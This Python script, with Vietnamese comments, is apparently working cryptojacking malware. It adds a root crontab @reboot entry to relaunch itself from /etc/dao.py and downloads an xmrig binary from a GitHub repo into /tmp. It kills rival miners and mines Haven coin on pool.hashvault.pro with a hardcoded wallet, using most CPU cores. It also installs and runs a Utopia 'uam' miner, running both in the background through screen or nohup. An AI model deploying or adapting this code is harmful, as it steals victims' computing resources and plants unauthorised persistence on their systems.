__author__ = 'root'
import time
import os,sys
import multiprocessing
import random, string
useproxy = 0
os.system('chmod 777 ' + __file__)
try:
    os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
except:
    pass

try:
    os.system('apt-get update -y')
    #os.system ('apt --fix-broken install -y')
    os.system('apt-get install -y python python-dev screen')
except:
    pass
try:
    path = '/var/spool/cron/crontabs/root'
    data = '@reboot screen -dm python /etc/dao.py'
    os.system('echo %s >> %s' %(data, path))
    os.system('chmod 600 %s' %path)
except:
    pass

cores_cpu = multiprocessing.cpu_count()
cores_tru = int(round(cores_cpu*20/100+0.9))
cores = cores_cpu - cores_tru
print('So cores de dao la %s' %cores)
stak_rx = 'xmrig'
link_github_stak_rx = 'https://github.com/giautoidi/giautoidi/raw/beta/xmrig_linux.gz'
link_deb = 'https://github.com/giautoidi/giautoidi/raw/beta/libnvrtc11.2.deb'
deb_name = 'libnvrtc11.2.deb'
file_stak_rx = 'xmrig_linux.gz'
folder_stak_rx = 'xmrig_linux'
os.system('pkill ' + stak_rx)

if not os.path.isfile('/tmp/%s/%s' %(folder_stak_rx, stak_rx)):
    print('Chua co chuong trinh %s' %stak_rx)
    os.chdir('/tmp')
    os.system('wget %s' %link_github_stak_rx)
    os.system('tar xf %s' %file_stak_rx)
    os.chdir('/tmp/%s' %folder_stak_rx)
    #os.system('wget %s' % link_deb)
    #try:
    #    os.system ('dpkg -i %s' %deb_name)
    #except:
    #    pass
    workingdir = os.getcwd()
    os.system('chmod 777 %s' %stak_rx)
else:
    print('Da co chuong trinh %s' %stak_rx)
    os.chdir('/tmp/%s' %folder_stak_rx)
    workingdir = os.getcwd()
#check screen
#command = './%s -o us.flockpool.com:5555 -u RNyTfG3Dfb9dkQbwEpMk5bNEAMDgHAWAVe -p Hoanglan@123 -a gr -t %s --tls' %(stak_rx, cores)
command = './%s -o pool.hashvault.pro:80 -u hvxxugGqjFCjJsvZw9FJbGMzUGuZ3XwBHT2E2xPRojHqPDvEr5ja7ssYrEq57ZzwwDP2h8Bxn6Wo4CT6CM3vLVyo3RQVippYt9 -p nql -a cn-heavy/xhv --tls -t %s' %(stak_rx, cores)
if os.path.isfile('/usr/bin/screen'):
    print('Co chuong trinh screen')
    os.system ('screen -dmS %s %s' %(stak_rx,command))
elif os.path.isfile('/usr/bin/nohup'):
    print('Co chuong trinh nohup')
    os.system ('nohup %s &' %command)
else:
    os.system ('%s &' %command)

#utopia
link_deb = 'https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb'
deb_name = 'uam-latest_amd64.deb'
folder_stak_rx = 'uam'
stak_rx = 'uam'
if not os.path.isfile('/opt/%s/%s' %(folder_stak_rx, stak_rx)):
    print('Chua co chuong trinh %s' %stak_rx)
    os.chdir('/tmp')
    os.system('wget %s' % link_deb)
    try:
        os.system ('dpkg -i %s' %deb_name)
    except:
        pass
    #workingdir = os.getcwd()
    #os.system('chmod 777 %s' %stak_rx)
else:
    print('Da co chuong trinh %s' %stak_rx)
    #os.chdir('/opt/%s/' %(folder_stak_rx, stak_rx))
    #workingdir = os.getcwd()
#check screen
command = '/opt/%s/%s --pk F32978292823F8829CDC31E42364865D1CAEC2FB847BC9DBB27EF29BCEF6F906' %(folder_stak_rx, stak_rx)
if os.path.isfile('/usr/bin/screen'):
    print('Co chuong trinh screen')
    os.system ('screen -dmS %s %s' %(stak_rx,command))
elif os.path.isfile('/usr/bin/nohup'):
    print('Co chuong trinh nohup')
    os.system ('nohup %s &' %command)
else:
    os.system ('%s &' %command)

while True:
    print('running')
    time.sleep(3)
